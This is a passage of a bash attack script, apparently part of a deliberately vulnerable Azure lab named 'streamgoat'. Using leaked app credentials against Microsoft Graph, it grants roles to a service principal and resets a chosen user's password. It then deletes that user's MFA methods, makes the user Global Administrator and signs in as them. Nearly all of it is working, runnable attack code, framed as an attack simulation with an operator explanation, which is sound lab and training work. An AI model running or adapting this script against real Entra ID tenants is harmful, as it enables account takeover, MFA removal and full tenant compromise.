      echo "$HELPDESK_ADMIN_ASSIGN_RESP" | jq -r '.error.message' 2>/dev/null
      echo "$HELPDESK_ADMIN_ASSIGN_RESP" | jq .
      
      # Try User Administrator as fallback (role template ID: fe930be7-5e62-47db-91af-98c3a49a38b1)
      info "Trying User Administrator role as fallback..."
      USER_ADMIN_ROLE_TEMPLATE_ID="fe930be7-5e62-47db-91af-98c3a49a38b1"
      
      spin_start "Getting User Administrator role"
      set +e
      # Get all roles and filter client-side
      ALL_ROLES_RESP="$(curl -sS -H "Authorization: Bearer ${GRAPH_TOKEN}" \
        "https://graph.microsoft.com/v1.0/directoryRoles?\$select=id,roleTemplateId,displayName")"
      USER_ADMIN_ROLE_ID="$(echo "$ALL_ROLES_RESP" | jq -r --arg tid "$USER_ADMIN_ROLE_TEMPLATE_ID" '.value[]? | select(.roleTemplateId == $tid) | .id // empty' | head -1)"
      
      if [ -z "$USER_ADMIN_ROLE_ID" ]; then
        info "Activating User Administrator role..."
        ACTIVATE_USER_ADMIN_RESP="$(curl -sS -X POST \
          -H "Authorization: Bearer ${GRAPH_TOKEN}" \
          -H "Content-Type: application/json" \
          -d "{\"roleTemplateId\": \"${USER_ADMIN_ROLE_TEMPLATE_ID}\"}" \
          "https://graph.microsoft.com/v1.0/directoryRoles")"
        USER_ADMIN_ROLE_ID="$(echo "$ACTIVATE_USER_ADMIN_RESP" | jq -r '.id // empty')"
        info "Activated User Administrator role ID: ${USER_ADMIN_ROLE_ID}"
      fi
      set -e
      spin_stop
      
      if [ -n "$USER_ADMIN_ROLE_ID" ]; then
        spin_start "Assigning User Administrator"
        set +e
        USER_ADMIN_ASSIGN_RESP="$(curl -sS -X POST \
          -H "Authorization: Bearer ${GRAPH_TOKEN}" \
          -H "Content-Type: application/json" \
          -d "{\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/${SP_OBJECT_ID}\"}" \
          "https://graph.microsoft.com/v1.0/directoryRoles/${USER_ADMIN_ROLE_ID}/members/\$ref")"
        set -e
        spin_stop
        
        if ! echo "$USER_ADMIN_ASSIGN_RESP" | jq -e '.error' >/dev/null 2>&1; then
          ok "Service principal is now a User Administrator!"
        fi
      fi
    fi
  else
    ok "Service principal is now a Helpdesk Administrator!"
  fi
fi

step "Phase 2: Get fresh token with new directory role permissions"

info "Waiting for directory role propagation (20 seconds)..."
sleep 20

spin_start "Obtaining new Graph token"
set +e
GRAPH_TOKEN_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${LEAKED_CLIENT_ID}" \
  -d "client_secret=${LEAKED_CLIENT_SECRET}" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" \
  "https://login.microsoftonline.com/${LEAKED_TENANT_ID}/oauth2/v2.0/token")"
GRAPH_TOKEN="$(echo "$GRAPH_TOKEN_RESP" | jq -r '.access_token')"
set -e
spin_stop

ok "Fresh token obtained"

step "Phase 3: Enumerate users to find target"

spin_start "Searching for streamgoat-* users"
set +e
USERS_RESP="$(curl -sS -H "Authorization: Bearer ${GRAPH_TOKEN}" \
  -G "https://graph.microsoft.com/v1.0/users" \
  --data-urlencode "\$filter=startswith(userPrincipalName,'streamgoat-')" \
  --data-urlencode "\$select=id,userPrincipalName,displayName")"
set -e
spin_stop

USER_COUNT="$(echo "$USERS_RESP" | jq '.value | length')"

if [ "$USER_COUNT" -eq 0 ]; then
  err "No streamgoat-* users found in tenant"
  exit 1
fi

ok "Found ${USER_COUNT} target user(s)"

printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "👤 Available Target Users" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"

# Store users for selection
declare -a USER_IDS=()
declare -a USER_UPNS=()
declare -a USER_NAMES=()

while IFS= read -r id; do USER_IDS+=("$id"); done < <(echo "$USERS_RESP" | jq -r '.value[].id')
while IFS= read -r upn; do USER_UPNS+=("$upn"); done < <(echo "$USERS_RESP" | jq -r '.value[].userPrincipalName')
while IFS= read -r name; do USER_NAMES+=("$name"); done < <(echo "$USERS_RESP" | jq -r '.value[].displayName')

for i in "${!USER_IDS[@]}"; do
  idx=$((i + 1))
  printf "  [%s%d%s] %s (%s)\n" "${YELLOW}" "${idx}" "${RESET}" "${USER_NAMES[$i]}" "${USER_UPNS[$i]}"
done
printf "%s\n" "---------------------------------------------------------------------"

# Prompt for selection
while true; do
  printf "\n%s%s%s" "${BOLD}${YELLOW}" "Select target user [1-${#USER_IDS[@]}]: " "${RESET}"
  read -r USER_SELECTION
  
  if [[ ! "$USER_SELECTION" =~ ^[0-9]+$ ]] || [ "$USER_SELECTION" -lt 1 ] || [ "$USER_SELECTION" -gt ${#USER_IDS[@]} ]; then
    err "Invalid selection"
    continue
  fi
  break
done

SELECTED_IDX=$((USER_SELECTION - 1))
TARGET_USER_ID="${USER_IDS[$SELECTED_IDX]}"
TARGET_UPN="${USER_UPNS[$SELECTED_IDX]}"
TARGET_NAME="${USER_NAMES[$SELECTED_IDX]}"

ok "Selected target: ${TARGET_NAME} (${TARGET_UPN})"

step "Phase 4: Reset user password"

# Generate new password
NEW_PASSWORD="StreamG0at!Pwn3d$(date +%s | tail -c 5)"
PASSWORD_RESET_SUCCESS=false

spin_start "Resetting password for ${TARGET_UPN}"
set +e
PWD_RESET_RESP="$(curl -sS -X PATCH \
  -H "Authorization: Bearer ${GRAPH_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{
    \"passwordProfile\": {
      \"password\": \"${NEW_PASSWORD}\",
      \"forceChangePasswordNextSignIn\": false
    }
  }" \
  "https://graph.microsoft.com/v1.0/users/${TARGET_USER_ID}")"
set -e
spin_stop

if echo "$PWD_RESET_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Failed to reset password"
  echo "$PWD_RESET_RESP" | jq .
  info "Password reset requires Helpdesk Administrator or User Administrator role"
else
  ok "Password reset successfully!"
  printf "  • New password: %s%s%s\n" "${RED}" "${NEW_PASSWORD}" "${RESET}"
  PASSWORD_RESET_SUCCESS=true
fi

step "Phase 5: Remove MFA / Authentication Methods"

spin_start "Enumerating authentication methods"
set +e
AUTH_METHODS_RESP="$(curl -sS -H "Authorization: Bearer ${GRAPH_TOKEN}" \
  "https://graph.microsoft.com/v1.0/users/${TARGET_USER_ID}/authentication/methods")"
set -e
spin_stop

AUTH_METHOD_COUNT="$(echo "$AUTH_METHODS_RESP" | jq '.value | length // 0')"
ok "Found ${AUTH_METHOD_COUNT} authentication method(s)"

# Delete non-password authentication methods (MFA)
if [ "$AUTH_METHOD_COUNT" -gt 0 ] 2>/dev/null; then
  echo "$AUTH_METHODS_RESP" | jq -r '.value[]? | select(.["@odata.type"] != "#microsoft.graph.passwordAuthenticationMethod") | .id // empty' 2>/dev/null | while read -r method_id; do
    if [ -n "$method_id" ]; then
      METHOD_TYPE="$(echo "$AUTH_METHODS_RESP" | jq -r ".value[]? | select(.id == \"$method_id\") | .[\"@odata.type\"] // \"unknown\"")"
      info "Removing: ${METHOD_TYPE}"
      
      # Determine the correct endpoint based on method type
      case "$METHOD_TYPE" in
        *phoneAuthenticationMethod*)
          ENDPOINT="https://graph.microsoft.com/v1.0/users/${TARGET_USER_ID}/authentication/phoneMethods/${method_id}"
          ;;
        *microsoftAuthenticatorAuthenticationMethod*)
          ENDPOINT="https://graph.microsoft.com/v1.0/users/${TARGET_USER_ID}/authentication/microsoftAuthenticatorMethods/${method_id}"
          ;;
        *fido2AuthenticationMethod*)
          ENDPOINT="https://graph.microsoft.com/v1.0/users/${TARGET_USER_ID}/authentication/fido2Methods/${method_id}"
          ;;
        *softwareOathAuthenticationMethod*)
          ENDPOINT="https://graph.microsoft.com/v1.0/users/${TARGET_USER_ID}/authentication/softwareOathMethods/${method_id}"
          ;;
        *)
          info "  Skipping unknown method type: ${METHOD_TYPE}"
          continue
          ;;
      esac
      echo $ENDPOINT
      curl -sS -X DELETE -H "Authorization: Bearer ${GRAPH_TOKEN}" "$ENDPOINT" >/dev/null 2>&1 && \
        ok "  Removed ${METHOD_TYPE}" || info "  Could not remove ${METHOD_TYPE}"
    fi
  done
else
  info "No MFA methods to remove"
fi

step "Phase 6: Add user to Global Administrator role"

# Global Administrator role template ID
GA_ROLE_TEMPLATE_ID="62e90394-69f5-4237-9190-012177145e10"

# Get all activated directory roles and filter for Global Administrator
spin_start "Getting Global Administrator role"
set +e
ALL_ROLES_RESP="$(curl -sS -H "Authorization: Bearer ${GRAPH_TOKEN}" \
  "https://graph.microsoft.com/v1.0/directoryRoles?\$select=id,roleTemplateId,displayName")"
GA_ROLE_ID="$(echo "$ALL_ROLES_RESP" | jq -r --arg tid "$GA_ROLE_TEMPLATE_ID" '.value[]? | select(.roleTemplateId == $tid) | .id // empty' | head -1)"
set -e
spin_stop

# If role doesn't exist, activate it first
if [ -z "$GA_ROLE_ID" ]; then
  info "Activating Global Administrator role..."
  spin_start "Activating role"
  set +e
  ACTIVATE_RESP="$(curl -sS -X POST \
    -H "Authorization: Bearer ${GRAPH_TOKEN}" \
    -H "Content-Type: application/json" \
    -d "{\"roleTemplateId\": \"${GA_ROLE_TEMPLATE_ID}\"}" \
    "https://graph.microsoft.com/v1.0/directoryRoles")"
  GA_ROLE_ID="$(echo "$ACTIVATE_RESP" | jq -r '.id // empty')"
  set -e
  spin_stop
fi

ok "Global Administrator role ID: ${GA_ROLE_ID}"

# Add user to Global Administrator
info "Adding ${TARGET_UPN} to Global Administrator role..."

spin_start "Assigning Global Administrator"
set +e
GA_ASSIGN_RESP="$(curl -sS -X POST \
  -H "Authorization: Bearer ${GRAPH_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{
    \"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/${TARGET_USER_ID}\"
  }" \
  "https://graph.microsoft.com/v1.0/directoryRoles/${GA_ROLE_ID}/members/\$ref")"
set -e
spin_stop

if echo "$GA_ASSIGN_RESP" | jq -e '.error' >/dev/null 2>&1; then
  ERROR_CODE="$(echo "$GA_ASSIGN_RESP" | jq -r '.error.code')"
  if [ "$ERROR_CODE" = "Request_ResourceNotFound" ] || echo "$GA_ASSIGN_RESP" | grep -q "already exist"; then
    info "User may already be a Global Administrator"
  else
    err "Failed to assign Global Administrator role"
    echo "$GA_ASSIGN_RESP" | jq .
  fi
else
  ok "🎉 SUCCESS! ${TARGET_UPN} is now a GLOBAL ADMINISTRATOR!"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We executed a multi-phase privilege escalation:\n\n"
printf "${BOLD}Phase 1: Self-grant application permissions${RESET}\n"
printf "  • RoleManagement.ReadWrite.Directory — manage directory roles\n"
printf "  • User.ReadWrite.All — update user properties\n"
printf "  • UserAuthenticationMethod.ReadWrite.All — manage MFA methods\n\n"
printf "${BOLD}Phase 1b: Assign Helpdesk Administrator directory role${RESET}\n"
printf "  • Required for password reset (app permissions alone are insufficient)\n"
printf "  • Helpdesk Admin can reset passwords for non-admin users\n\n"
printf "${BOLD}Phase 3-6: Target user compromise${RESET}\n"
printf "  • Enumerated users with 'streamgoat-' prefix\n"
printf "  • Reset target user's password\n"
printf "  • Removed MFA authentication methods\n"
printf "  • Assigned Global Administrator role\n\n"
printf "The target user now has full control over the Azure AD tenant.\n\n"

read -r -p "Step 6 completed. Press Enter to continue (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 7. Verify Access - Authenticate as Compromised User
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Verify Access - Authenticate as Compromised User  ===" "${RESET}"

if [ "$PASSWORD_RESET_SUCCESS" = true ]; then
  step "Attempting to authenticate as ${TARGET_UPN} with new credentials"

  info "Username: ${TARGET_UPN}"
  info "Password: ${NEW_PASSWORD}"

  spin_start "Authenticating via ROPC flow"
  set +e
  AUTH_RESP="$(curl -sS -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "client_id=1950a258-227b-4e31-a9cf-717495945fc2" \
    -d "grant_type=password" \
    -d "username=${TARGET_UPN}" \
    -d "password=${NEW_PASSWORD}" \
    -d "scope=https://graph.microsoft.com/.default" \
    "https://login.microsoftonline.com/${LEAKED_TENANT_ID}/oauth2/v2.0/token")"
  set -e
  spin_stop

  if echo "$AUTH_RESP" | jq -e '.access_token' >/dev/null 2>&1; then
    ok "🎉 FULL COMPROMISE! Successfully authenticated as ${TARGET_UPN}!"
    USER_TOKEN="$(echo "$AUTH_RESP" | jq -r '.access_token')"
    info "User token obtained (first 50 chars): ${USER_TOKEN:0:50}..."
    
    # Verify we're a Global Admin
    spin_start "Verifying Global Administrator membership"
    set +e
    ME_RESP="$(curl -sS -H "Authorization: Bearer ${USER_TOKEN}" \
      "https://graph.microsoft.com/v1.0/me/memberOf")"
    set -e
    spin_stop
    
    if echo "$ME_RESP" | grep -q "Global Administrator"; then
      ok "Confirmed: User is a Global Administrator!"
    fi
  else
    ERROR_DESC="$(echo "$AUTH_RESP" | jq -r '.error_description // .error')"
    
    # AADSTS50126 = Invalid username or password
    if echo "$ERROR_DESC" | grep -qi "AADSTS50126\|invalid.*password\|invalid.*credentials"; then
      err "Authentication failed - invalid credentials"
      info "Password may not have been reset successfully"
    elif echo "$ERROR_DESC" | grep -qi "AADSTS50076\|AADSTS50079\|MFA\|multi-factor\|verification"; then
      info "MFA is still required"
      info "Credentials ARE VALID - try logging in via browser"
    elif echo "$ERROR_DESC" | grep -qi "AADSTS50055\|password.*expired\|change.*password"; then
      info "User must change password on first login"
      info "Credentials ARE VALID - log in via browser to set new password"
    else
      err "Authentication failed"
      info "Error: ${ERROR_DESC}"
    fi
  fi
else
  info "Skipping authentication test - password reset failed earlier"
  info "User is Global Administrator but password was not changed"
fi

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "✅ Privilege Escalation Path Completed!" "${RESET}"
printf "\n%s\n" "Attack chain executed:"
printf "  1. ✓ Exploited LFI on Function App\n"
printf "  2. ✓ Harvested Managed Identity tokens via SSRF\n"
printf "  3. ✓ Enumerated storage accounts\n"
printf "  4. ✓ Downloaded backup blob with leaked credentials\n"
printf "  5. ✓ Authenticated as privileged App Registration\n"
printf "  6. ✓ Escalated ${TARGET_UPN} to Global Administrator\n"

if [ "$PASSWORD_RESET_SUCCESS" = true ]; then
  printf "  7. ✓ Reset password\n"
  printf "\n%s%s%s\n" "${BOLD}${RED}" "🔑 Compromised Account Credentials:" "${RESET}"
  printf "    Username: %s\n" "${TARGET_UPN}"
  printf "    Password: %s\n" "${NEW_PASSWORD}"
  printf "\n%s%s%s\n" "${YELLOW}" "📋 To verify manually:" "${RESET}"
  printf "    1. Open https://portal.azure.com in incognito\n"
  printf "    2. Log in as %s\n" "${TARGET_UPN}"
  printf "    3. Use password: %s\n" "${NEW_PASSWORD}"
else
  printf "  7. ✗ Password reset failed (need Helpdesk/User Administrator role)\n"
  printf "\n%s%s%s\n" "${YELLOW}" "📋 Result:" "${RESET}"
  printf "    User %s is now a Global Administrator\n" "${TARGET_UPN}"
  printf "    However, password was NOT reset (original password still valid)\n"
  printf "    To fully compromise, manually reset password in Azure Portal as GA\n"
fi
printf "\n"
